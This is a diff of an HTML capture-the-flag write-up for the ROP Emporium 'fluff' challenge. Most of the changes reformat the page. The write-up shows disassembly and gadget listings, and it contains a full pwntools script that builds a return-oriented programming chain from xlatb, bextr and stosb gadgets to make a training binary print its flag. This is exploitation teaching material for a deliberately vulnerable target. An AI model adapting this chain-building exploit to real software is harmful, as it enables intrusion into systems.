@@ -21,8 +21,7 @@ more sparse binary with much more questionable gadgets.
 
 We can start, as usual, by determining the layout of the file
 
-radare
-──────────────────────────────────────────────────────────────────────
+<bl>
   $ rabin2 -i ./fluff
   [Imports]
   nth vaddr      bind   type   lib name
@@ -40,7 +39,7 @@ radare
   22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
   23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
   24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
-──────────────────────────────────────────────────────────────────────
+</bl>
 
 As we'll see, it's pretty similar to the last couple as far as that goes. We'll 
 then work backwords to figure out how we need to construct our chain.
@@ -53,22 +52,15 @@ not a lot of particularly simple gadgets to use, but that was expected.
 We do have a pop rdi gadget that will likely be useful for calling our 
 print_file() function later though.
 
-ropper
-───────────────────────────────────
   <r>0x00000000004006a3</r>: <y>pop</y> rdi<bl>;</bl> <y>ret</y><bl>;</bl>
-───────────────────────────────────
 
 However, there's one more hint on the page:
 
 <a href="https://ropemporium.com/challenge/fluff.html">fluff.html</a>
-─────────────────────────────────────────────────────────────────────────
-  Some useful(?) gadgets are available at the questionableGadgets symbol.
-─────────────────────────────────────────────────────────────────────────
+  <bl>Some useful(?) gadgets are available at the questionableGadgets symbol.</bl>
 
 We'll then check that out in radare.
 
-radare
-──────────────────────────────────────────────────────────────────
   <y>[0x00400628]></y> pd
               <bl>;-- questionableGadgets:</bl>
               <bl>;-- rip:</bl>
@@ -83,7 +75,6 @@ radare
               <g>0x0040063a</g>      <bl>c3</bl>             <r>ret</r>
               <g>0x0040063b</g>      <bl>0f1f</bl><y>44</y><g>0000</g>     <bl>nop dword</bl> [<bl>rax</bl> + <bl>rax</bl>]
               <r>; DATA XREF from entry0 @ 0x400536(r)</r>
-──────────────────────────────────────────────────────────────────
 
 There are a couple gadgets here that stand out as different from the rest and 
 those are xlatb, bextr, and stosb.
@@ -105,57 +96,56 @@ we can do that with bextr.
 Putting together the final script took a lot more troubleshooting and also 
 google searches than the last ones.
 
-exploit.py
-───────────────────────────────────────────────────────────────────────────────
-<bl>from</bl> pwn <bl>import</bl> *
+  <bl>from</bl> pwn <bl>import</bl> *
 
-e = ELF(<pl>'fluff'</pl>)
-p = process(e.path)
-context(arch=<pl>'amd64'</pl>, os=<pl>'linux'</pl>, endian=<pl>'little'</pl>)
+  e = ELF(<pl>'fluff'</pl>)
+  p = process(e.path)
+  context(arch=<pl>'amd64'</pl>, os=<pl>'linux'</pl>, endian=<pl>'little'</pl>)
 
-junk = b<pl>'A'</pl> * <pl>40</pl>
-flag = (b<pl>"flag.txt"</pl>)
-data = <pl>0x00601028</pl>                           <bl># .data</bl>
-print_file = p64(<pl>0x00400510</pl>)                <bl># print_file()</bl>
-xlatb = p64(<pl>0x00400628</pl>)                     <bl># xlatb</bl>
-pop_rdx_rcx_add_rcx_bextr = p64(<pl>0x0040062a</pl>) <bl># pop rdx; pop rcx; add rcx, </bl>
-					    <bl># 0x3ef2; bextr rbx, rcx, rdx; ret; </bl>
-bextr = p64(<pl>0x00400633</pl>)                     <bl># bextr rbx, rcx, rdx</bl>
-stosb = p64(<pl>0x00400639</pl>)                     <bl># stosb byte [rdi], al </bl>
-pop_rdi = p64(<pl>0x004006a3</pl>)                   <bl># pop rdi</bl>
+  junk = b<pl>'A'</pl> * <pl>40</pl>
+  flag = (b<pl>"flag.txt"</pl>)
+  data = <pl>0x00601028</pl>                           <bl># .data</bl>
+  print_file = p64(<pl>0x00400510</pl>)                <bl># print_file()</bl>
+  xlatb = p64(<pl>0x00400628</pl>)                     <bl># xlatb</bl>
+  pop_rdx_rcx_add_rcx_bextr = p64(<pl>0x0040062a</pl>) <bl># pop rdx; pop rcx; add rcx, </bl>
+					      <bl># 0x3ef2; bextr rbx, rcx, rdx;</bl>
+  bextr = p64(<pl>0x00400633</pl>)                     <bl># bextr rbx, rcx, rdx</bl>
+  stosb = p64(<pl>0x00400639</pl>)                     <bl># stosb byte [rdi], al </bl>
+  pop_rdi = p64(<pl>0x004006a3</pl>)                   <bl># pop rdi</bl>
 
-					    <bl># make "flag.txt" an array of</bl> 
-					    <bl># addresses</bl>
-flag_chars = []
-<y>for</y> i <y>in</y> flag:                              <bl># address of character + offset</bl>
-    addr = hex(read(<pl>'fluff'</pl>).find(i) + e.address)
-    flag_chars.append(addr)                 <bl># add to array</bl>
+  					      <bl># make "flag.txt" an array of</bl> 
+  					      <bl># addresses</bl>
+  flag_chars = []
+  <y>for</y> i <y>in</y> flag:                              <bl># address of character + offset</bl>
+      addr = hex(read(<pl>'fluff'</pl>).find(i) + e.address)
+      flag_chars.append(addr)                 <bl># add to array</bl>
 
-payload = junk
+  payload = junk
 
-<y>for</y> i, flag_chars <y>in</y> enumerate(flag_chars):
-    if(i == <pl>0</pl>):                             <bl># set current rax value (previous</bl>
-	rax = <pl>0xb</pl>                           <bl># value to be set)</bl>
-    else:
-	rax = flag[i - <pl>1</pl>]                   <bl># after first run, previous value</bl>
+  <y>for</y> i, flag_chars <y>in</y> enumerate(flag_chars):
+      if(i == <pl>0</pl>):                             <bl># set current rax value (previous</bl>
+  	  rax = <pl>0xb</pl>                           <bl># value to be set)</bl>
+      else:
+	  rax = flag[i - <pl>1</pl>]                   <bl># after first run, previous value</bl>
     
-    payload += pop_rdx_rcx_add_rcx_bextr
-    payload += p64(<pl>0x4000</pl>)                  <bl># length of 40 (64 bits)</bl>
-    payload += p64(int(flag_chars, <pl>16</pl>) - rax - <pl>0x3ef2</pl>)
-    payload += xlatb                        <bl># char index - rax - 0x3ef2</bl>
-    payload += pop_rdi                      <bl># (added junk from gadget)</bl>
-    payload += p64(data + i)                <bl># write to data + char index</bl>
-    payload += stosb
+      payload += pop_rdx_rcx_add_rcx_bextr
+      payload += p64(<pl>0x4000</pl>)                  <bl># length of 40 (64 bits)</bl>
+      payload += p64(int(flag_chars, <pl>16</pl>) - rax - <pl>0x3ef2</pl>)
+      payload += xlatb                        <bl># char index - rax - 0x3ef2</bl>
+      payload += pop_rdi                      <bl># (added junk from gadget)</bl>
+      payload += p64(data + i)                <bl># write to data + char index</bl>
+      payload += stosb
 
-payload += pop_rdi                          <bl># print file</bl>
-payload += p64(data)
-payload += print_file
+  payload += pop_rdi                          <bl># print file</bl>
+  payload += p64(data)
+  payload += print_file
 
-<bl>print</bl>(payload)
+  <bl>print</bl>(payload)
 
-p.sendline(payload)
-log.info(p.clean())
-───────────────────────────────────────────────────────────────────────────────
+  p.sendline(payload)
+  log.info(p.clean())
+
+
 </pre>
 </body>
 </html>
